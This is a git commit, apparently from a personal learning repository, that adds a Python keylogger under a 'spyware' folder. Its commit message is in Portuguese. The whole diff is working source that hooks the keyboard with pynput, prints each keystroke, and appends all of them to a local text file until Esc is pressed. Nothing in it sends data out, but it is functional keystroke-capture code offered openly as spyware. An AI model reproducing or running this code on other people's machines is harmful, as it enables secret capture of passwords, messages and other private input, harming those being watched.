91144ecb757161de964cf4da436648aa16550432
VictorGM01 <victormarques8801@gmail.com>
2021-09-30 22:57:49 -0300

    # criando keylogger com pynput

---
+++ spyware/keylogger.py
@@ -0,0 +1,32 @@
+from pynput.keyboard import Key, Listener
+
+
+contador = 0
+teclas_pressionadas = []
+
+def pressionar_tecla(tecla):
+    global teclas_pressionadas, contador
+    teclas_pressionadas.append(tecla)
+    contador += 1
+    print(tecla)
+    if contador >= 1:
+        contador = 0
+        salvar(teclas_pressionadas)
+        teclas_pressionadas = []
+
+def salvar(teclas):
+    with open("salvar.txt", "a") as arquivo:
+        arquivo.write('\n')
+        for tecla in teclas:
+            tecla = str(tecla).replace("'", "")
+            if tecla.find("tecla") == -1:
+                arquivo.write(tecla)
+
+def liberar_tecla(tecla):
+    if tecla == Key.esc:
+        return False
+
+
+with Listener(on_press=pressionar_tecla,
+              on_release=liberar_tecla) as listener:
+    listener.join()
